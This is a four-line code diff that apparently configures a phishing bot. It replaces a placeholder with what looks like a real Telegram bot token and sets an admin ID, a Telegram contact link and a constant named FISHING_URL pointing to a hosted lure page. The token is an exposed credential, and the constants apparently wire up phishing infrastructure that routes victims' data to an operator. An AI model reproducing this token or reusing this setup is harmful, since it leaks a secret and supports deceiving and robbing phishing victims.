@@ -1,4 +1,4 @@
-const BOT_TOKEN = "example";
+const BOT_TOKEN = "7740401254:AAGqaGtAQ2YEiwXtjert2CiuWFADXbGz3Jg";
 const ADMIN_ID = "7216371031";
 const TELEGRAM_LINK = "https://t.me/mohdrishad";
 const FISHING_URL = "https://heavenscake.vercel.app/page.html";
